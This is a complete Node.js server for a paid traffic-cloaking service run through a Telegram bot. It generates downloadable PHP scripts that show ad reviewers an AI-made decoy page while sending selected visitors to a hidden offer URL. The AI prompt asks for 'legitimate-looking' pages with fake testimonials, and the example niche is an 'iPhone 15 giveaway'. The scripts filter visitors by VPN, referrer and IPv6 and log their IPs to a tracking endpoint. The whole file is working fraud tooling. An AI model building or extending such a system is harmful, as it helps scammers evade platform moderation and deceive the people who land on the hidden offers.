// server.js – Full Cloaking SaaS with Telegram Bot (Webhook + Inline Buttons)
require('dotenv').config();
const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const axios = require('axios');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const { Telegraf, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// ---------- Database Setup ----------
const db = new sqlite3.Database(path.join(__dirname, 'cloaking.db'));

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        telegram_id TEXT UNIQUE,
        plan TEXT DEFAULT 'free',
        subscription_id TEXT,
        subscription_status TEXT DEFAULT 'inactive',
        credits INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS campaigns (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        name TEXT,
        offer_url TEXT,
        white_niche TEXT,
        white_html TEXT,
        clicks_per_ip INTEGER DEFAULT 15,
        clicks_before_filter INTEGER DEFAULT 5,
        block_vpn INTEGER DEFAULT 0,
        block_ipv6 INTEGER DEFAULT 0,
        block_no_isp INTEGER DEFAULT 0,
        block_no_referrer INTEGER DEFAULT 0,
        countries_allowed TEXT,
        devices_allowed TEXT,
        os_allowed TEXT,
        browsers_allowed TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS stats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        campaign_id TEXT,
        ip TEXT,
        user_agent TEXT,
        decision TEXT,
        country TEXT,
        isp TEXT,
        device TEXT,
        os TEXT,
        browser TEXT,
        referrer TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS temp_sessions (
        telegram_id TEXT PRIMARY KEY,
        step TEXT,
        data TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// ---------- Express App ----------
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false }));
app.use(express.static('public'));

// ---------- Helper: AI White Page ----------
async function generateWhitePage(niche, extra = {}) {
    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for the niche: "${niche}". Company: ${extra.company || ''}. Phone: ${extra.phone || ''}. Email: ${extra.email || ''}. Theme: ${extra.theme || 'default'}, Language: ${extra.language || 'English'}. Return only the HTML code (including <html>, <head>, <body>). Use inline CSS. Make it look professional with a call to action, fake testimonials, and a convincing design. Keep file size under 60KB.`;
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${process.env.GEMINI_API_KEY}`;
    const response = await axios.post(url, {
        contents: [{ parts: [{ text: prompt }] }]
    });
    let html = response.data.candidates[0].content.parts[0].text;
    html = html.replace(/```html/g, '').replace(/```/g, '');
    return html;
}

// ---------- Helper: Generate index.php (FIXED) ----------
function generateIndexPHP(campaign) {
    const { id, offer_url, white_html, clicks_per_ip, clicks_before_filter,
            block_vpn, block_ipv6, block_no_isp, block_no_referrer } = campaign;
    
    // Escape white_html for embedding inside PHP HEREDOC
    const escapedWhiteHtml = white_html.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    
    return `<?php
// Cloaking script for campaign: ${id}
$api_url = "https://${process.env.DOMAIN}/api/track";
$campaign_id = "${id}";
$offer_url = "${offer_url}";
$clicks_per_ip = ${clicks_per_ip || 15};
$clicks_before_filter = ${clicks_before_filter || 5};
$block_vpn = ${block_vpn ? 1 : 0};
$block_ipv6 = ${block_ipv6 ? 1 : 0};
$block_no_isp = ${block_no_isp ? 1 : 0};
$block_no_referrer = ${block_no_referrer ? 1 : 0};

// White page HTML
$white_html = '${escapedWhiteHtml}';

// Get visitor IP
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getUserIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'] ?? '';

// Simple detection (expand as needed)
$is_vpn = false; // Add VPN detection API if required
$is_ipv6 = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6);
$has_isp = true; // Placeholder
$has_referrer = !empty($referrer);

// Decision logic
$show_offer = true;
if ($block_vpn && $is_vpn) $show_offer = false;
if ($block_ipv6 && $is_ipv6) $show_offer = false;
if ($block_no_isp && !$has_isp) $show_offer = false;
if ($block_no_referrer && !$has_referrer) $show_offer = false;

// Track click
$data = [
    "campaign_id" => $campaign_id,
    "ip" => $ip,
    "user_agent" => $user_agent,
    "decision" => $show_offer ? "main" : "white",
    "referrer" => $referrer
];
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
curl_exec($ch);
curl_close($ch);

// Redirect or show white page
if ($show_offer) {
    header("Location: $offer_url");
    exit;
} else {
    echo $white_html;
}
?>`;
}

// ---------- Auth Middleware ----------
const auth = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token && !req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
    if (token) {
        try {
            const decoded = jwt.verify(token, process.env.JWT_SECRET);
            req.userId = decoded.id;
        } catch(e) { return res.status(401).json({ error: 'Invalid token' }); }
    } else {
        req.userId = req.session.userId;
    }
    next();
};

// ---------- User Routes ----------
app.post('/api/register', async (req, res) => {
    const { email, password, telegram_id } = req.body;
    const hashed = await bcrypt.hash(password, 10);
    db.run(`INSERT INTO users (email, password, telegram_id, plan) VALUES (?, ?, ?, 'free')`, [email, hashed, telegram_id], function(err) {
        if (err) return res.status(400).json({ error: 'Email or Telegram ID already exists' });
        res.json({ success: true });
    });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    db.get(`SELECT * FROM users WHERE email = ?`, [email], async (err, user) => {
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const token = jwt.sign({ id: user.id, email: user.email, plan: user.plan }, process.env.JWT_SECRET);
        req.session.userId = user.id;
        res.json({ token, user: { id: user.id, email: user.email, plan: user.plan, telegram_id: user.telegram_id } });
    });
});

// ---------- Campaign Routes ----------
app.post('/api/campaigns', auth, async (req, res) => {
    const { name, offer_url, white_niche, clicks_per_ip, clicks_before_filter,
            block_vpn, block_ipv6, block_no_isp, block_no_referrer } = req.body;
    const id = crypto.randomUUID();
    const whiteHtml = await generateWhitePage(white_niche);
    db.run(`INSERT INTO campaigns (id, user_id, name, offer_url, white_niche, white_html, clicks_per_ip, clicks_before_filter, block_vpn, block_ipv6, block_no_isp, block_no_referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [id, req.userId, name, offer_url, white_niche, whiteHtml, clicks_per_ip || 15, clicks_before_filter || 5,
             block_vpn ? 1 : 0, block_ipv6 ? 1 : 0, block_no_isp ? 1 : 0, block_no_referrer ? 1 : 0], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true, id });
    });
});

app.get('/api/campaigns', auth, (req, res) => {
    db.all(`SELECT id, name, offer_url, white_niche, created_at FROM campaigns WHERE user_id = ?`, [req.userId], (err, rows) => {
        res.json(rows);
    });
});

app.get('/api/campaigns/:id/stats', auth, (req, res) => {
    const campaignId = req.params.id;
    db.get(`SELECT COUNT(CASE WHEN decision='main' THEN 1 END) as main, COUNT(CASE WHEN decision='white' THEN 1 END) as white FROM stats WHERE campaign_id = ?`, [campaignId], (err, row) => {
        res.json(row || { main: 0, white: 0 });
    });
});

app.get('/api/campaigns/:id/download', auth, (req, res) => {
    const campaignId = req.params.id;
    db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, req.userId], (err, campaign) => {
        if (!campaign) return res.status(404).json({ error: 'Campaign not found' });
        const phpCode = generateIndexPHP(campaign);
        res.setHeader('Content-Disposition', `attachment; filename="cloak_${campaignId}.php"`);
        res.setHeader('Content-Type', 'application/x-httpd-php');
        res.send(phpCode);
    });
});

// ---------- Tracking Endpoint (for index.php) ----------
app.post('/api/track', (req, res) => {
    const { campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer } = req.body;
    db.run(`INSERT INTO stats (campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [campaign_id, ip, user_agent, decision, country, isp, device, os, browser, referrer], (err) => {
        res.json({ ok: true });
    });
});

// ---------- Stripe Webhook ----------
app.post('/stripe-webhook', express.raw({type: 'application/json'}), async (req, res) => {
    const sig = req.headers['stripe-signature'];
    let event;
    try {
        event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
    } catch(e) { return res.status(400).send(`Webhook Error: ${e.message}`); }
    if (event.type === 'checkout.session.completed') {
        const session = event.data.object;
        const userId = session.metadata.userId;
        const plan = session.metadata.plan;
        db.run(`UPDATE users SET plan = ?, subscription_status = 'active' WHERE id = ?`, [plan, userId]);
    }
    res.json({received: true});
});

// ---------- Telegram Bot with Webhook ----------
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

// Helper: Get or create user session (conversation state)
async function getTempSession(telegramId) {
    return new Promise((resolve) => {
        db.get(`SELECT step, data FROM temp_sessions WHERE telegram_id = ?`, [telegramId], (err, row) => {
            if (row) resolve({ step: row.step, data: row.data ? JSON.parse(row.data) : {} });
            else resolve({ step: null, data: {} });
        });
    });
}
async function setTempSession(telegramId, step, data = {}) {
    db.run(`INSERT OR REPLACE INTO temp_sessions (telegram_id, step, data) VALUES (?, ?, ?)`, [telegramId, step, JSON.stringify(data)]);
}
async function clearTempSession(telegramId) {
    db.run(`DELETE FROM temp_sessions WHERE telegram_id = ?`, [telegramId]);
}

// Check if telegram_id is linked to a user
async function getUserIdByTelegram(telegramId) {
    return new Promise((resolve) => {
        db.get(`SELECT id FROM users WHERE telegram_id = ?`, [telegramId], (err, row) => {
            resolve(row ? row.id : null);
        });
    });
}

// Bot commands
bot.start(async (ctx) => {
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) {
        await ctx.reply(
            'Welcome! You need to link your Telegram account to a Cloaking System account.\nPlease send your **email** (registered on our website) to link.',
            Markup.inlineKeyboard([
                [Markup.button.callback('Register new account', 'register_new')]
            ])
        );
        setTempSession(telegramId, 'awaiting_email');
    } else {
        await ctx.reply(`Welcome back! Use buttons below:`, Markup.inlineKeyboard([
            [Markup.button.callback('📋 My Campaigns', 'list_campaigns')],
            [Markup.button.callback('➕ New Campaign', 'new_campaign')],
            [Markup.button.callback('📊 Stats', 'stats_menu')],
            [Markup.button.callback('⬇️ Download Script', 'download_menu')]
        ]));
    }
});

bot.action('register_new', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply('Go to our website and register: https://yourdomain.com/register\nThen use /start again with the same email.');
});

// Handle email linking
bot.on('text', async (ctx) => {
    const telegramId = ctx.from.id;
    const session = await getTempSession(telegramId);
    if (session.step === 'awaiting_email') {
        const email = ctx.message.text.trim();
        db.get(`SELECT id FROM users WHERE email = ?`, [email], async (err, user) => {
            if (!user) {
                await ctx.reply('No account found with that email. Please register first.');
                return;
            }
            db.run(`UPDATE users SET telegram_id = ? WHERE id = ?`, [telegramId, user.id], (err) => {
                if (err) ctx.reply('Error linking. Try again.');
                else {
                    ctx.reply('✅ Linked successfully! Now use /start again.');
                    clearTempSession(telegramId);
                }
            });
        });
        return;
    }
    // Handle campaign creation conversation
    if (session.step === 'new_campaign_name') {
        session.data.name = ctx.message.text;
        setTempSession(telegramId, 'new_campaign_offer', session.data);
        await ctx.reply('Send offer URL (where real visitors go):');
    } else if (session.step === 'new_campaign_offer') {
        session.data.offer_url = ctx.message.text;
        setTempSession(telegramId, 'new_campaign_niche', session.data);
        await ctx.reply('Send niche for AI white page (e.g., "iPhone 15 giveaway"):');
    } else if (session.step === 'new_campaign_niche') {
        session.data.white_niche = ctx.message.text;
        const userId = await getUserIdByTelegram(telegramId);
        if (!userId) return ctx.reply('You are not linked. Please /start again.');
        // Generate white page
        await ctx.reply('Generating white page with AI...⏳');
        const whiteHtml = await generateWhitePage(session.data.white_niche);
        const campaignId = crypto.randomUUID();
        db.run(`INSERT INTO campaigns (id, user_id, name, offer_url, white_niche, white_html)
                VALUES (?, ?, ?, ?, ?, ?)`,
                [campaignId, userId, session.data.name, session.data.offer_url, session.data.white_niche, whiteHtml], async (err) => {
            if (err) {
                await ctx.reply('Error creating campaign.');
            } else {
                await ctx.reply(`✅ Campaign created!\n\nName: ${session.data.name}\nID: ${campaignId}\nUse /download ${campaignId} to get index.php`);
            }
            clearTempSession(telegramId);
        });
    }
});

// Action handlers for inline buttons
bot.action('list_campaigns', async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name, offer_url FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns found. Create one with /new');
        let msg = '📋 *Your Campaigns:*\n';
        rows.forEach(c => {
            msg += `\n🔹 *${c.name}*\n   ID: \`${c.id}\`\n   Offer: ${c.offer_url}\n`;
        });
        ctx.reply(msg, { parse_mode: 'Markdown' });
    });
});

bot.action('new_campaign', async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) return ctx.reply('Not linked. Please /start');
    setTempSession(telegramId, 'new_campaign_name', {});
    await ctx.reply('Send campaign name:');
});

bot.action('stats_menu', async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns.');
        const buttons = rows.map(c => [Markup.button.callback(c.name, `stats_${c.id}`)]);
        ctx.reply('Select campaign to see stats:', Markup.inlineKeyboard(buttons));
    });
});

// Handle stats action
bot.action(/stats_(.+)/, async (ctx) => {
    const campaignId = ctx.match[1];
    await ctx.answerCbQuery();
    db.get(`SELECT COUNT(CASE WHEN decision='main' THEN 1 END) as main, COUNT(CASE WHEN decision='white' THEN 1 END) as white FROM stats WHERE campaign_id = ?`, [campaignId], (err, row) => {
        const main = row?.main || 0;
        const white = row?.white || 0;
        ctx.reply(`📊 Stats for campaign \`${campaignId}\`:\n✅ Main clicks: ${main}\n❌ White page views: ${white}`, { parse_mode: 'Markdown' });
    });
});

bot.action('download_menu', async (ctx) => {
    await ctx.answerCbQuery();
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    if (!userId) return ctx.reply('Not linked. Please /start');
    db.all(`SELECT id, name FROM campaigns WHERE user_id = ?`, [userId], (err, rows) => {
        if (!rows || rows.length === 0) return ctx.reply('No campaigns.');
        const buttons = rows.map(c => [Markup.button.callback(c.name, `download_${c.id}`)]);
        ctx.reply('Select campaign to download index.php:', Markup.inlineKeyboard(buttons));
    });
});

bot.action(/download_(.+)/, async (ctx) => {
    const campaignId = ctx.match[1];
    await ctx.answerCbQuery();
    const telegramId = ctx.from.id;
    const userId = await getUserIdByTelegram(telegramId);
    db.get(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`, [campaignId, userId], (err, campaign) => {
        if (!campaign) return ctx.reply('Campaign not found.');
        const phpCode = generateIndexPHP(campaign);
        // Send as file (Telegram allows small files)
        const buffer = Buffer.from(phpCode, 'utf-8');
        ctx.replyWithDocument({ source: buffer, filename: `cloak_${campaignId}.php` });
    });
});

// Command handlers for non-inline usage (optional)
bot.command('new', (ctx) => ctx.reply('Please use /start to open the menu.'));
bot.command('list', (ctx) => ctx.reply('Please use /start to open the menu.'));
bot.command('stats', (ctx) => ctx.reply('Please use /start to open the menu.'));
bot.command('download', (ctx) => ctx.reply('Please use /start to open the menu.'));

// Set webhook instead of long polling
const WEBHOOK_PATH = '/telegram-webhook';
const WEBHOOK_URL = `${process.env.RENDER_EXTERNAL_URL || process.env.DOMAIN}${WEBHOOK_PATH}`;
bot.telegram.setWebhook(WEBHOOK_URL).then(() => console.log(`Webhook set to ${WEBHOOK_URL}`));
app.use(bot.webhookCallback(WEBHOOK_PATH));

// ---------- Frontend ----------
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'views', 'dashboard.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'views', 'admin.html')));

// ---------- Start Server ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
